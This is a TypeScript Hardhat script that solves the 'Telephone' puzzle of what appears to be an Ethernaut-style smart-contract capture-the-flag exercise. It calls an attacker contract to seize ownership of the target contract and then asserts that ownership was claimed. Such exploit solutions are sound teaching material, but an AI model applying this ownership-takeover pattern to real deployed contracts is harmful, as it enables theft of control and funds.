// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import contractAddresses from "../constants/contractAddresses.json";
import assert from "assert";

const PLAYER_ADDRESS: string = contractAddresses.Player;
const CONTRACT = contractAddresses.Telephone;
const CONTRACTATTACKER = contractAddresses.TelephoneAttacker;

async function main() {
    console.log(
        "Script to solve Telephone puzzle \n ========================================== \n"
    );

    const attacker = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Telephone", CONTRACT, attacker);
    const contractAttacker = await ethers.getContractAt("TelephoneAttacker", CONTRACTATTACKER);

    await contractAttacker.changeOwner(PLAYER_ADDRESS);
    let owner: string = await contract.owner();

    assert(owner === PLAYER_ADDRESS, "Ownership not claimed");
    console.log("Ownership claimed, you can submit your answer");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
